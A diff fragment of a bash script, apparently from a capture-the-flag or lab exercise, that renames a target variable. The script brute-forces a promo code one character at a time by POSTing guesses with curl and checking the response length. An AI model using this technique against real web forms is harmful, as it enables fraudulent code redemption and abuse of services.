@@ -3,12 +3,12 @@ PORT=8010
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.118:'$PORT
+    url='http://141.85.224.118:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # One by one
@@ -24,7 +24,7 @@ while [ -n "$str" ]; do
     char="${str%$next}"
     aux=$aux$char
     echo "Check SSS$aux"
-    out=$(curl -s -d 'promo=SSS'$aux'&submit=Redeem' -H "Content-Type: application/x-www-form-urlencoded" -X POST $remote | wc -c)
+    out=$(curl -s -d 'promo=SSS'$aux'&submit=Redeem' -H "Content-Type: application/x-www-form-urlencoded" -X POST $url | wc -c)
     if [ $out -eq 11085 ]
     then
         echo "Match character - $char"
